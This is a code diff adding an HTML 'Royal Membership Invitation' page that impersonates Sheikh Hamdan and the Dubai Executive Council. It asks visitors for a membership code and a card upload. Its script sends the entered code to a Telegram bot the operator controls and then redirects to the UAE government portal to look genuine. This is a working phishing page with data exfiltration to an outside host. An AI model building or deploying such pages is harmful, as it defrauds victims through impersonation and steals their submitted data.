@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Royal Membership Invitation</title>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(to right, #f7e8b7, #dfb06a);
+            color: #5b3a00;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 30px;
+            background: #8b6f47;
+            border-radius: 10px;
+            color: white;
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .header-icons {
+            display: flex;
+            gap: 30px;
+        }
+
+        .header-icons a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .header-icons i {
+            font-size: 28px;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+
+        .header-icons i:hover {
+            transform: scale(1.2);
+        }
+
+        .profile-img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 2px solid white;
+        }
+
+        .clock {
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #fff;
+            border-radius: 15px;
+            box-shadow: 0px 10px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        h5, h6 {
+            color: #8b6f47;
+            margin-bottom: 10px;
+        }
+
+        ul {
+            text-align: left;
+            margin: 10px 0;
+            padding-left: 20px;
+        }
+
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 10px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+
+        button {
+            background: #8b6f47;
+            color: white;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+
+        button:hover {
+            transform: scale(1.05);
+        }
+
+        .floating-support {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #8b6f47;
+            color: white;
+            padding: 15px;
+            border-radius: 50%;
+            cursor: grab;
+            transition: transform 0.5s ease-in-out;
+            animation: floatAnimation 2s infinite alternate ease-in-out, zoomEffect 2s infinite alternate ease-in-out;
+        }
+
+        .floating-support a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .progress-indicator {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            width: 80px;
+            height: 80px;
+            margin-top: -40px;
+            margin-left: -40px;
+            border: 8px solid rgba(255, 215, 0, 0.3);
+            border-top: 8px solid gold;
+            border-radius: 50%;
+            animation: spin 1s linear infinite, zoomEffect 1s alternate infinite;
+            z-index: 1000;
+        }
+
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes zoomEffect {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.2); }
+        }
+
+        @keyframes floatAnimation {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-10px); }
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 30%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(255, 215, 0, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 5px 15px rgba(0, 0, 0, 0.3);
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="header-icons">
+            <a href="https://your-support-link.com" target="_blank">
+                <i class="material-icons">support_agent</i>
+            </a>
+            <i class="material-icons">verified_user</i>
+            <i class="material-icons">star</i>
+        </div>
+        <div class="clock" id="clock"></div>
+        <img src="https://tse2.mm.bing.net/th?id=OIP.Krgv4VeD0BKRbLhrYusvEAHaHe&pid=Api" alt="Sheikh Hamdan" class="profile-img">
+    </div>
+
+    <div class="container">
+        <h5>Royal Membership Requirements</h5>
+        <h6>To ascend to this prestigious status, one must:</h6>
+        <ul>
+            <li>Uphold the principles of the Dubai Executive Council.</li>
+            <li>Demonstrate dedication to our esteemed mission.</li>
+            <li>Complete the official membership declaration.</li>
+        </ul>
+          <h6 style="padding: 2vw; margin: auto; display: block; text-align: center; font-size: 0.9em; max-width: 90%; font-style: italic;">
+    Become a member now:  
+    <i> signed</i> by <span style="font-family: 'Pacifico', cursive;">Sheikh Hamdan bin Mohammed bin Rashid Al Maktoum</span>
+      </h6>
+        <hr/>
+        <h5>Submit Your Membership Card</h5>
+        <input type="text" id="membershipCode" placeholder="Enter Membership Code">
+        <input type="file" id="membershipCard">
+        <button onclick="submitMembership()">Submit</button>
+
+        <div class="progress-indicator" id="progressIndicator"></div>
+        <div class="modal" id="errorModal">Membership submission failed!</div>
+    </div>
+
+    <div class="floating-support" draggable="true">
+        <a href="https://your-support-link.com" target="_blank">
+            <i class="material-icons">support</i>
+        </a>
+    </div>
+
+    <script>
+        function updateClock() {
+            document.getElementById("clock").innerText = new Date().toLocaleTimeString();
+        }
+        setInterval(updateClock, 1000);
+
+        function submitMembership() {
+            let code = document.getElementById("membershipCode").value;
+            let file = document.getElementById("membershipCard").files[0];
+
+            if (!code || !file) {
+                document.getElementById("errorModal").style.display = "block";
+                setTimeout(() => document.getElementById("errorModal").style.display = "none", 3000);
+                return;
+            }
+
+            let progress = document.getElementById("progressIndicator");
+            progress.style.display = "block";
+
+            setTimeout(() => {
+                let botToken = "YOUR_BOT_TOKEN";
+                let chatId = "YOUR_CHAT_ID";
+                let message = `Membership Code: ${code}`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                    .then(() => {
+                        progress.style.display = "none";
+                        window.location.href = "https://u.ae";
+                    })
+                    .catch(() => alert("Submission failed!"));
+            }, 5000);
+        }
+    </script>
+
+</body>
+</html>
